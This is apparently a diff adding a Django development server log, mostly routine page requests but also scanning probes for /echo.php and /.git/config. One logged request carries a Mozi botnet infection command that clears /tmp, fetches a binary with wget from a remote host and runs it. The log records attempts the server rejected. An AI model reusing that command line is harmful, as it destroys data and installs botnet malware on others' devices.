@@ -1,0 +1,14 @@
+Watching for file changes with StatReloader
+[24/Jul/2023 02:44:09] "GET / HTTP/1.1" 200 1515
+Not Found: /echo.php
+[24/Jul/2023 02:50:18] "GET /echo.php HTTP/1.1" 404 6502
+Not Found: /shell
+[24/Jul/2023 03:34:14] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 6585
+[24/Jul/2023 03:54:56] "GET / HTTP/1.1" 200 1515
+[24/Jul/2023 03:56:23] "GET / HTTP/1.1" 200 1515
+[24/Jul/2023 04:00:40] "GET / HTTP/1.1" 200 1515
+[24/Jul/2023 04:20:50] "GET / HTTP/1.1" 200 1515
+Not Found: /.git/config
+[24/Jul/2023 04:40:54] "GET /.git/config HTTP/1.1" 404 6513
+Not Found: /.git/config
+[24/Jul/2023 04:40:55] "GET /.git/config HTTP/1.1" 404 6513
